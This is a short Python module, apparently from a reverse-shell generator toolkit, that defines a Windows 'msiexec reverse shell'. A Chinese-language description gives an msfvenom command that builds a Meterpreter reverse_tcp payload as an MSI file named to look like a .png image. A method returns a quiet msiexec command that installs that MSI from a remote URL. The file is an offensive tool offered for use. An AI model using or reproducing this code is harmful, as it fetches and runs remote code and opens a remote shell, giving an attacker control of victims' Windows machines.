# encoding: utf8

class Shell:
    def __init__(self):
        self.info = {
            'Name': 'msiexec reverse shell',
            'Author': 'nul1',
            'Update': '2018/9/15',
        }

        self.desc_reverse = """
msiexec是系统进程，是Windows Installer的一部分，用于安装Windows Installer安装包（MSI）

Platform: Windows All

Msi file:
    msfvenom -f msi -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 > 1.png

"""

    def reverse(self, url):
        return "msiexec /q /i {0}".format(url)
